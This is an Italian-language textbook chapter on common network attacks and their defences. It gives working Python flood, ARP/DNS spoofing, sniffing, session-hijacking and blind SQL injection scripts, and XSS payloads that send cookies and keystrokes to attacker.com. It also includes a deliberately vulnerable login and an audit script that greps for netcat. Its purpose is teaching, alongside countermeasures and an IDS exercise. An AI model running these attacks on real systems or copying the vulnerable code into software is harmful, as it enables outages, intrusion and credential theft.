# Capitolo 33 - Attacchi di Rete Comuni

> **PARTE 10 - ATTACCHI E DIFESE DI RETE**

---

## Introduzione

Gli **attacchi di rete** rappresentano una delle principali minacce alla sicurezza informatica moderna. Questo capitolo analizza i tipi più comuni di attacchi, le loro caratteristiche, le tecniche di rilevamento e le contromisure efficaci.

### Obiettivi di Apprendimento
- Comprendere i principali tipi di attacchi di rete
- Analizzare le tecniche utilizzate dagli attaccanti
- Implementare difese e contromisure appropriate
- Riconoscere i segnali di un attacco in corso
- Applicare best practices per la sicurezza di rete

---

## Concetti Principali

### Definizione

Un **attacco di rete** è un tentativo deliberato di compromettere la sicurezza, l'integrità, la disponibilità o la confidenzialità di una rete informatica o dei suoi dati.

Gli attacchi possono essere classificati secondo diversi criteri:

**Per Obiettivo:**
- **Confidenzialità**: intercettazione dati (sniffing, MITM)
- **Integrità**: modifica dati (spoofing, session hijacking)
- **Disponibilità**: negazione servizio (DoS, DDoS)
- **Autenticazione**: impersonificazione (spoofing, replay attack)

**Per Tecnica:**
- **Passivi**: osservazione traffico senza modifiche
- **Attivi**: interazione diretta con sistema/rete
- **Insider**: da utente interno autorizzato
- **Outsider**: da attaccante esterno

### Caratteristiche

**Fasi di un Attacco:**

1. **Reconnaissance (Ricognizione)**
   - Raccolta informazioni sul target
   - Scanning porte e servizi
   - Fingerprinting OS e applicazioni

2. **Scanning**
   - Identificazione vulnerabilità
   - Enumerazione risorse
   - Mappatura rete

3. **Gaining Access (Accesso)**
   - Sfruttamento vulnerabilità
   - Credential stealing
   - Exploit execution

4. **Maintaining Access (Persistenza)**
   - Installazione backdoor
   - Escalation privilegi
   - Lateral movement

5. **Covering Tracks (Cancellazione Tracce)**
   - Modifica log
   - Eliminazione evidenze
   - Anti-forensics

---

## Tipologie di Attacchi

### 1. Denial of Service (DoS) / Distributed DoS (DDoS)

**Descrizione:**
Attacco che mira a rendere indisponibile un servizio sovraccaricando le risorse del sistema target.

**Tecniche:**

**SYN Flood:**
```python
# Invio massivo di pacchetti SYN senza completare handshake
from scapy.all import *
import random

def syn_flood(target_ip, target_port):
    """SYN Flood attack (solo per scopi educativi)"""
    while True:
        # IP sorgente random (spoofed)
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        
        # Crea pacchetto SYN
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        pkt = ip/tcp
        
        # Invia senza attendere risposta
        send(pkt, verbose=0)

# NOTA: Codice solo a scopo educativo - illegale utilizzarlo senza autorizzazione
```

**UDP Flood:**
```python
# Invio massivo di pacchetti UDP
import socket
import random

def udp_flood(target_ip, target_port):
    """UDP Flood attack (solo educativo)"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)  # 1KB di dati random
    
    while True:
        sock.sendto(payload, (target_ip, target_port))
```

**HTTP Flood (Layer 7 DDoS):**
```python
# Richieste HTTP legittime in grande quantità
import requests
import threading

def http_flood(target_url, num_threads=100):
    """HTTP Flood attack (solo educativo)"""
    def worker():
        while True:
            try:
                requests.get(target_url, timeout=1)
            except:
                pass
    
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
```

**Contromisure:**
- Rate limiting
- SYN cookies
- Traffic filtering
- CDN e load balancing
- Anycast network
- DDoS mitigation services (Cloudflare, Akamai)

---

### 2. Man-in-the-Middle (MITM)

**Descrizione:**
Attaccante si interpone tra due parti comunicanti, intercettando e potenzialmente modificando i dati.

**ARP Spoofing/Poisoning:**
```python
from scapy.all import *
import time

def arp_spoof(target_ip, gateway_ip, interface="eth0"):
    """ARP Spoofing attack (solo educativo)"""
    
    # Get MAC addresses
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    # Crea pacchetti ARP falsi
    # Dice al target che noi siamo il gateway
    arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=gateway_ip)
    
    # Dice al gateway che noi siamo il target
    arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                      psrc=target_ip)
    
    print("[*] Starting ARP spoofing...")
    try:
        while True:
            send(arp_target, verbose=0)
            send(arp_gateway, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Stopping ARP spoofing...")
        # Restore ARP tables
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    """Ripristina ARP cache corretto"""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=gateway_ip, hwsrc=gateway_mac), count=5)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=target_ip, hwsrc=target_mac), count=5)
```

**DNS Spoofing:**
```python
from scapy.all import *

def dns_spoof(pkt, fake_ip):
    """DNS Spoofing - risponde a query DNS con IP falso"""
    if pkt.haslayer(DNSQR):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=fake_ip))
        send(spoofed_pkt, verbose=0)
        print(f"[*] Spoofed DNS response sent for {pkt[DNS].qd.qname.decode()}")

# Sniff DNS queries e risponde con IP falso
sniff(filter="udp port 53", prn=lambda x: dns_spoof(x, "192.168.1.100"))
```

**Contromisure:**
- HTTPS/TLS per crittografia end-to-end
- Certificate pinning
- Static ARP entries
- DNSSEC
- VPN
- 802.1X authentication
- Port security su switch

---

### 3. Packet Sniffing

**Descrizione:**
Intercettazione passiva del traffico di rete per catturare dati sensibili.

**Network Sniffer:**
```python
from scapy.all import *

def packet_callback(packet):
    """Analizza pacchetti catturati"""
    if packet.haslayer(TCP):
        if packet[TCP].dport == 80 or packet[TCP].sport == 80:
            # HTTP traffic
            if packet.haslayer(Raw):
                payload = packet[Raw].load.decode(errors='ignore')
                if "Authorization" in payload or "password" in payload.lower():
                    print(f"[!] Potential credentials found:")
                    print(payload[:200])
    
    elif packet.haslayer(UDP):
        if packet[UDP].dport == 53:
            # DNS query
            if packet.haslayer(DNSQR):
                print(f"[DNS Query] {packet[DNSQR].qname.decode()}")

# Cattura traffico su interfaccia
sniff(iface="eth0", prn=packet_callback, store=0)
```

**Password Sniffing (HTTP/FTP/Telnet):**
```python
from scapy.all import *
import re

def extract_credentials(packet):
    """Estrae credenziali da protocolli non cifrati"""
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors='ignore')
        
        # HTTP Basic Auth
        http_auth = re.findall(r'Authorization: Basic ([^\r\n]+)', payload)
        if http_auth:
            import base64
            creds = base64.b64decode(http_auth[0]).decode()
            print(f"[HTTP] Credentials: {creds}")
        
        # FTP
        if packet[TCP].dport == 21 or packet[TCP].sport == 21:
            if 'USER' in payload or 'PASS' in payload:
                print(f"[FTP] {payload.strip()}")
        
        # Telnet
        if packet[TCP].dport == 23 or packet[TCP].sport == 23:
            print(f"[Telnet] {payload[:100]}")

sniff(prn=extract_credentials, filter="tcp", store=0)
```

**Contromisure:**
- Crittografia (HTTPS, SSH, VPN)
- Switch invece di hub (limita broadcast)
- Port security
- Encrypted protocols (TLS/SSL)
- Network segmentation
- IDS/IPS

---

### 4. IP/MAC Spoofing

**Descrizione:**
Falsificazione indirizzo IP o MAC per impersonare dispositivo legittimo.

**IP Spoofing:**
```python
from scapy.all import *

def ip_spoof(src_ip, dst_ip, dst_port):
    """Invia pacchetto con IP sorgente falsificato"""
    # Crea pacchetto con IP sorgente spoofed
    spoofed_packet = IP(src=src_ip, dst=dst_ip) / \
                     TCP(dport=dst_port, flags="S")
    
    # Invia
    send(spoofed_packet, verbose=0)
    print(f"[*] Sent spoofed packet from {src_ip} to {dst_ip}:{dst_port}")

# Esempio: impersona 192.168.1.100
ip_spoof("192.168.1.100", "192.168.1.1", 80)
```

**MAC Spoofing:**
```bash
# Linux
ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig eth0 up

# macOS
sudo ifconfig en0 ether 00:11:22:33:44:55

# Windows
# Via Device Manager → Network Adapter → Advanced → Network Address
```

```python
# Via scapy
from scapy.all import *

def mac_spoof(iface, fake_mac):
    """Invia pacchetti con MAC spoofed"""
    packet = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
             ARP(op=2, psrc="192.168.1.100", hwsrc=fake_mac)
    sendp(packet, iface=iface)
```

**Contromisure:**
- Ingress/egress filtering
- Anti-spoofing ACLs
- Reverse path forwarding (RPF)
- Static ARP entries
- 802.1X authentication
- MAC filtering (limitato)

---

### 5. Session Hijacking

**Descrizione:**
Furto di sessione attiva per impersonare utente legittimo.

**TCP Session Hijacking:**
```python
from scapy.all import *

def tcp_hijack(target_ip, target_port, server_ip, server_port, seq, ack):
    """TCP session hijacking (solo educativo)"""
    # Crea pacchetto con sequence numbers corretti
    ip = IP(src=target_ip, dst=server_ip)
    tcp = TCP(sport=target_port, dport=server_port, flags="PA",
              seq=seq, ack=ack)
    payload = "malicious command\r\n"
    
    packet = ip/tcp/payload
    send(packet, verbose=0)
    print("[*] Hijacked packet sent")

# Nota: richiede sniffing precedente per ottenere SEQ/ACK corretti
```

**Cookie Hijacking:**
```python
# Via XSS (Cross-Site Scripting)
# JavaScript payload iniettato:
"""
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
"""

# Server attacker riceve cookie
# steal.php:
"""
<?php
$cookie = $_GET['cookie'];
file_put_contents('cookies.txt', $cookie . "\n", FILE_APPEND);
?>
"""
```

**Contromisure:**
- HTTPS (TLS encryption)
- HTTPOnly flag sui cookie
- Secure flag sui cookie
- Session timeout
- Regenerate session ID dopo login
- Bind session a IP address (con cautela)
- Token CSRF

---

### 6. Port Scanning

**Descrizione:**
Identificazione porte aperte e servizi in ascolto su target.

**TCP Connect Scan:**
```python
import socket

def tcp_connect_scan(host, ports):
    """Full TCP connection scan"""
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"[+] Port {port} is open")
            open_ports.append(port)
        sock.close()
    return open_ports

# Scan common ports
tcp_connect_scan("192.168.1.1", range(1, 1024))
```

**SYN Scan (Stealth):**
```python
from scapy.all import *

def syn_scan(host, ports):
    """SYN scan - più stealthy"""
    open_ports = []
    for port in ports:
        # Invia SYN
        pkt = IP(dst=host)/TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)
        
        if resp is not None:
            if resp.haslayer(TCP):
                if resp[TCP].flags == 18:  # SYN-ACK
                    open_ports.append(port)
                    # Invia RST per chiudere connessione
                    send(IP(dst=host)/TCP(dport=port, flags="R"), verbose=0)
    
    return open_ports
```

**Nmap Integration:**
```python
import nmap

def nmap_scan(host):
    """Usa nmap per scan completo"""
    nm = nmap.PortScanner()
    
    # SYN scan con service detection
    nm.scan(host, arguments='-sS -sV -O')
    
    for host in nm.all_hosts():
        print(f"\nHost: {host} ({nm[host].hostname()})")
        print(f"State: {nm[host].state()}")
        
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in sorted(ports):
                state = nm[host][proto][port]['state']
                service = nm[host][proto][port]['name']
                version = nm[host][proto][port].get('version', '')
                print(f"  {port}/{proto}\t{state}\t{service} {version}")
```

**Contromisure:**
- Firewall rules
- Port knocking
- IDS/IPS signatures
- Close unused ports
- Service banners hiding
- Honeypots
- Rate limiting

---

### 7. SQL Injection

**Descrizione:**
Iniezione di codice SQL malicious in input applicazione web.

**Basic SQL Injection:**
```python
# Vulnerable code example
import sqlite3

def vulnerable_login(username, password):
    """Login vulnerabile a SQL injection"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # VULNERABLE: concatenazione diretta
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    result = cursor.fetchone()
    
    return result is not None

# Attack example:
# username: admin' OR '1'='1
# password: anything
# Query diventa: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

**Union-Based Injection:**
```sql
-- Payload per estrarre dati da altre tabelle
' UNION SELECT username, password FROM admin_users --

-- Enumerazione database
' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Dump completo
' UNION SELECT username, password FROM users WHERE '1'='1
```

**Blind SQL Injection:**
```python
import requests

def blind_sqli(url, payload):
    """Blind SQL injection - estrae dati byte per byte"""
    result = ""
    for pos in range(1, 50):
        for char_code in range(32, 127):
            # Test character at position
            injection = f"' AND ASCII(SUBSTRING(password,{pos},1))={char_code}--"
            response = requests.get(url, params={'id': injection})
            
            if "Welcome" in response.text:  # True condition
                result += chr(char_code)
                print(f"[+] Found: {result}")
                break
        else:
            break  # End of string
    return result
```

**Contromisure:**
```python
# SECURE: prepared statements/parameterized queries
def secure_login(username, password):
    """Login sicuro con parametri"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # Uso placeholders
    query = "SELECT * FROM users WHERE username=? AND password=?"
    cursor.execute(query, (username, password))
    result = cursor.fetchone()
    
    return result is not None

# Input validation
import re

def validate_input(username):
    """Valida input"""
    # Solo caratteri alfanumerici
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Invalid username format")
    return username

# ORM usage (SQLAlchemy)
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

def orm_login(username, password):
    """Login con ORM - automaticamente sicuro"""
    session = Session()
    user = session.query(User).filter_by(
        username=username,
        password=password
    ).first()
    return user is not None
```

---

### 8. Cross-Site Scripting (XSS)

**Descrizione:**
Iniezione di codice JavaScript malicious in pagine web visualizzate da altri utenti.

**Reflected XSS:**
```html
<!-- Vulnerable page -->
<p>Search results for: <?php echo $_GET['q']; ?></p>

<!-- Attack URL -->
http://victim.com/search?q=<script>alert(document.cookie)</script>

<!-- More dangerous: cookie stealing -->
http://victim.com/search?q=<script>
document.location='http://attacker.com/steal.php?c='+document.cookie;
</script>
```

**Stored XSS:**
```html
<!-- Attacker submits comment with malicious script -->
<script>
// Invia cookies a server attacker
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal', true);
xhr.send('cookie=' + document.cookie);

// Keylogger
document.onkeypress = function(e) {
    xhr.send('key=' + e.key);
};
</script>
```

**DOM-Based XSS:**
```html
<!-- Vulnerable JavaScript -->
<script>
var name = location.hash.substring(1);
document.write("Welcome " + name);
</script>

<!-- Attack URL -->
http://victim.com/#<img src=x onerror="alert(document.cookie)">
```

**Contromisure:**
```python
# Input sanitization
import html

def sanitize_input(user_input):
    """Escape HTML entities"""
    return html.escape(user_input)

# Output encoding
from jinja2 import escape

def safe_output(data):
    """Jinja2 auto-escaping"""
    return escape(data)

# Content Security Policy (CSP)
"""
Content-Security-Policy: default-src 'self'; 
                         script-src 'self' https://trusted-cdn.com;
                         object-src 'none';
"""

# HTTPOnly cookies
"""
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
"""

# Input validation
import re

def validate_input(data):
    """Whitelist approach"""
    allowed_pattern = r'^[a-zA-Z0-9\s\-_\.]+$'
    if not re.match(allowed_pattern, data):
        raise ValueError("Invalid input")
    return data
```

---

## Best Practices

### 1. Implementazione Difese Multi-Livello (Defense in Depth)

```yaml
Perimetro:
  - Firewall hardware
  - IDS/IPS
  - DDoS mitigation

Network:
  - VLAN segmentation
  - Network ACLs
  - Switch port security

Host:
  - Host-based firewall
  - Antivirus/EDR
  - HIDS

Application:
  - Input validation
  - Output encoding
  - Secure coding practices

Data:
  - Encryption at rest
  - Encryption in transit
  - Access controls
```

### 2. Monitoring e Logging

```python
# Centralized logging
import logging
import syslog

# Setup logging
logging.basicConfig(
    filename='/var/log/security.log',
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

def log_security_event(event_type, details):
    """Log eventi di sicurezza"""
    logging.warning(f"Security Event: {event_type} - {details}")
    
    # Invia a SIEM
    syslog.syslog(syslog.LOG_WARNING, f"{event_type}: {details}")

# Detection rules
def detect_port_scan(ip_address, connection_attempts):
    """Rileva port scanning"""
    threshold = 20  # connessioni in 60 secondi
    if connection_attempts > threshold:
        log_security_event("PORT_SCAN", f"Detected from {ip_address}")
        block_ip(ip_address)
```

### 3. Network Segmentation

```
DMZ (Demilitarized Zone):
  - Web servers
  - Mail servers
  - Public-facing services

Internal Network:
  - Workstations
  - Application servers

Secure Zone:
  - Database servers
  - Authentication servers
  - Critical infrastructure

Management Network:
  - Admin workstations
  - Infrastructure management
```

### 4. Regular Security Audits

```bash
#!/bin/bash
# Security audit script

echo "=== Security Audit Report ==="
echo "Date: $(date)"

# Check open ports
echo -e "\n[*] Open Ports:"
netstat -tuln | grep LISTEN

# Check firewall rules
echo -e "\n[*] Firewall Rules:"
iptables -L -n -v

# Check failed login attempts
echo -e "\n[*] Failed Login Attempts:"
grep "Failed password" /var/log/auth.log | tail -20

# Check running services
echo -e "\n[*] Running Services:"
systemctl list-units --type=service --state=running

# Check suspicious processes
echo -e "\n[*] Suspicious Processes:"
ps aux | grep -E 'nc|ncat|netcat|telnet' | grep -v grep

# Check network connections
echo -e "\n[*] Active Network Connections:"
netstat -anp | grep ESTABLISHED

# Check for SUID files
echo -e "\n[*] SUID Files:"
find / -perm -4000 -type f 2>/dev/null
```

### 5. Incident Response Plan

```yaml
Phase 1 - Detection:
  - Monitor alerts
  - Analyze logs
  - Identify anomalies

Phase 2 - Containment:
  - Isolate affected systems
  - Block malicious IPs
  - Disable compromised accounts

Phase 3 - Eradication:
  - Remove malware
  - Patch vulnerabilities
  - Reset credentials

Phase 4 - Recovery:
  - Restore services
  - Verify integrity
  - Resume operations

Phase 5 - Lessons Learned:
  - Document incident
  - Update procedures
  - Improve defenses
```

---

## Esercizi

### Esercizio 33.1 - Network Scanner (★☆☆)

Creare uno scanner di rete che:
- Rilevi host attivi in una subnet
- Identifichi porte aperte su ogni host
- Determini servizi in esecuzione

```python
# Soluzione template
import socket
import concurrent.futures
from ipaddress import IPv4Network

def scan_port(ip, port):
    """Scansiona singola porta"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        sock.close()
        return port if result == 0 else None
    except:
        return None

def scan_host(ip, ports=range(1, 1024)):
    """Scansiona host"""
    print(f"[*] Scanning {ip}...")
    open_ports = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(scan_port, ip, port) for port in ports]
        for future in concurrent.futures.as_completed(futures):
            port = future.result()
            if port:
                open_ports.append(port)
    
    return open_ports

# Test
if __name__ == "__main__":
    network = IPv4Network('192.168.1.0/24')
    for ip in network.hosts():
        open_ports = scan_host(str(ip))
        if open_ports:
            print(f"[+] {ip}: {open_ports}")
```

### Esercizio 33.2 - Packet Analyzer (★★☆)

Implementare un analizzatore di pacchetti che:
- Catturi traffico di rete
- Filtri per protocollo (TCP/UDP/ICMP)
- Estragga informazioni rilevanti
- Salvi risultati in formato leggibile

```python
# Soluzione template
from scapy.all import *
import datetime

class PacketAnalyzer:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.packets = []
    
    def analyze_packet(self, packet):
        """Analizza singolo pacchetto"""
        info = {
            'timestamp': datetime.datetime.now(),
            'protocol': None,
            'src': None,
            'dst': None,
            'length': len(packet)
        }
        
        if packet.haslayer(IP):
            info['src'] = packet[IP].src
            info['dst'] = packet[IP].dst
            
            if packet.haslayer(TCP):
                info['protocol'] = 'TCP'
                info['sport'] = packet[TCP].sport
                info['dport'] = packet[TCP].dport
                info['flags'] = packet[TCP].flags
            
            elif packet.haslayer(UDP):
                info['protocol'] = 'UDP'
                info['sport'] = packet[UDP].sport
                info['dport'] = packet[UDP].dport
            
            elif packet.haslayer(ICMP):
                info['protocol'] = 'ICMP'
                info['type'] = packet[ICMP].type
        
        self.packets.append(info)
        self.print_packet(info)
    
    def print_packet(self, info):
        """Stampa informazioni pacchetto"""
        if info['protocol']:
            print(f"[{info['timestamp']}] {info['protocol']} "
                  f"{info['src']} → {info['dst']}")
    
    def start_capture(self, count=100):
        """Avvia cattura pacchetti"""
        print(f"[*] Starting capture on {self.interface}...")
        sniff(iface=self.interface, prn=self.analyze_packet, 
              count=count, store=0)
    
    def save_report(self, filename):
        """Salva report analisi"""
        with open(filename, 'w') as f:
            for pkt in self.packets:
                f.write(str(pkt) + '\n')

# Test
analyzer = PacketAnalyzer()
analyzer.start_capture(count=50)
analyzer.save_report('packet_analysis.txt')
```

### Esercizio 33.3 - Intrusion Detection System (★★★)

Sviluppare un IDS semplificato che:
- Monitora traffico di rete in tempo reale
- Rileva pattern sospetti (port scan, DoS, etc.)
- Genera alert per attività anomale
- Implementa contromisure automatiche

```python
# Soluzione template
from scapy.all import *
from collections import defaultdict
import time
import threading

class SimpleIDS:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.connection_tracker = defaultdict(list)
        self.blocked_ips = set()
        self.alerts = []
        
        # Thresholds
        self.port_scan_threshold = 20  # porte in 60 sec
        self.syn_flood_threshold = 100  # SYN in 10 sec
        
        # Start cleanup thread
        self.cleanup_thread = threading.Thread(target=self.cleanup_tracker)
        self.cleanup_thread.daemon = True
        self.cleanup_thread.start()
    
    def analyze_packet(self, packet):
        """Analizza pacchetto per pattern sospetti"""
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            
            # Skip blocked IPs
            if src_ip in self.blocked_ips:
                return
            
            # Check for port scanning
            if packet.haslayer(TCP):
                self.detect_port_scan(packet)
                self.detect_syn_flood(packet)
            
            # Check for ARP spoofing
            if packet.haslayer(ARP):
                self.detect_arp_spoofing(packet)
    
    def detect_port_scan(self, packet):
        """Rileva port scanning"""
        src_ip = packet[IP].src
        dst_port = packet[TCP].dport
        current_time = time.time()
        
        # Track connections
        self.connection_tracker[src_ip].append({
            'port': dst_port,
            'time': current_time
        })
        
        # Check threshold
        recent_connections = [
            c for c in self.connection_tracker[src_ip]
            if current_time - c['time'] < 60
        ]
        
        unique_ports = len(set(c['port'] for c in recent_connections))
        
        if unique_ports > self.port_scan_threshold:
            self.generate_alert(
                "PORT_SCAN",
                f"Port scan detected from {src_ip}",
                src_ip
            )
    
    def detect_syn_flood(self, packet):
        """Rileva SYN flood"""
        if packet[TCP].flags == "S":  # SYN flag
            src_ip = packet[IP].src
            current_time = time.time()
            
            # Count SYN packets
            syn_packets = [
                c for c in self.connection_tracker[src_ip]
                if current_time - c['time'] < 10
            ]
            
            if len(syn_packets) > self.syn_flood_threshold:
                self.generate_alert(
                    "SYN_FLOOD",
                    f"SYN flood detected from {src_ip}",
                    src_ip
                )
    
    def detect_arp_spoofing(self, packet):
        """Rileva ARP spoofing"""
        if packet[ARP].op == 2:  # ARP reply
            # Check for duplicate IP/MAC mappings
            # Implementation depends on maintaining ARP cache
            pass
    
    def generate_alert(self, alert_type, message, src_ip):
        """Genera alert e applica contromisure"""
        alert = {
            'type': alert_type,
            'message': message,
            'timestamp': time.time(),
            'src_ip': src_ip
        }
        self.alerts.append(alert)
        
        print(f"[ALERT] {alert_type}: {message}")
        
        # Automatic countermeasure: block IP
        self.block_ip(src_ip)
    
    def block_ip(self, ip):
        """Blocca IP tramite iptables"""
        self.blocked_ips.add(ip)
        print(f"[BLOCKED] {ip}")
        
        # Execute iptables command
        import subprocess
        subprocess.run([
            'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'
        ], check=False)
    
    def cleanup_tracker(self):
        """Pulisce vecchie entries dal tracker"""
        while True:
            time.sleep(300)  # ogni 5 minuti
            current_time = time.time()
            
            for ip in list(self.connection_tracker.keys()):
                self.connection_tracker[ip] = [
                    c for c in self.connection_tracker[ip]
                    if current_time - c['time'] < 3600
                ]
    
    def start_monitoring(self):
        """Avvia monitoring"""
        print(f"[*] Starting IDS on {self.interface}...")
        sniff(iface=self.interface, prn=self.analyze_packet, store=0)

# Test
ids = SimpleIDS()
ids.start_monitoring()
```

---

## Domande di Verifica

1. **Qual è la differenza tra DoS e DDoS? Descrivi tre tecniche comuni di attacco DoS.**

2. **Spiega come funziona un attacco Man-in-the-Middle tramite ARP spoofing. Quali contromisure possono essere implementate?**

3. **Cosa sono gli attacchi di SQL Injection? Fornisci esempi di payload e spiega come prevenirli utilizzando prepared statements.**

4. **Descrivi le tre tipologie di Cross-Site Scripting (Reflected, Stored, DOM-based). Come si differenziano e quali sono le contromisure appropriate?**

5. **Cosa si intende per "Defense in Depth"? Illustra i vari livelli di difesa in un'architettura di rete sicura.**

6. **Spiega la differenza tra attacchi passivi e attivi. Fornisci esempi per ciascuna categoria.**

7. **Come funziona un SYN Flood attack? Perché è efficace e quali contromisure esistono (es. SYN cookies)?**

8. **Descrivi le fasi tipiche di un attacco informatico (Kill Chain). Per ogni fase, indica possibili punti di rilevamento e difesa.**

---

## Riferimenti

### Documentazione e Standard
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Vulnerabilità web più critiche
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/) - Errori software pericolosi

### Tools
- [Wireshark](https://www.wireshark.org/) - Network protocol analyzer
- [Nmap](https://nmap.org/) - Network scanner
- [Scapy](https://scapy.net/) - Packet manipulation tool
- [Metasploit](https://www.metasploit.com/) - Penetration testing framework
- [Burp Suite](https://portswigger.net/burp) - Web application security

### Libri
- "Network Security Essentials" - William Stallings
- "Hacking: The Art of Exploitation" - Jon Erickson
- "The Web Application Hacker's Handbook" - Dafydd Stuttard
- "Black Hat Python" - Justin Seitz

### Risorse Online
- [HackTheBox](https://www.hackthebox.eu/) - Penetration testing labs
- [OverTheWire](https://overthewire.org/) - Security wargames
- [SANS Reading Room](https://www.sans.org/reading-room/) - Security papers

---

**Capitolo Precedente**: [32 - Firewall e Sistemi di Rilevamento](#)  
**Prossimo Capitolo**: [34 - Sicurezza delle Applicazioni Web](#)
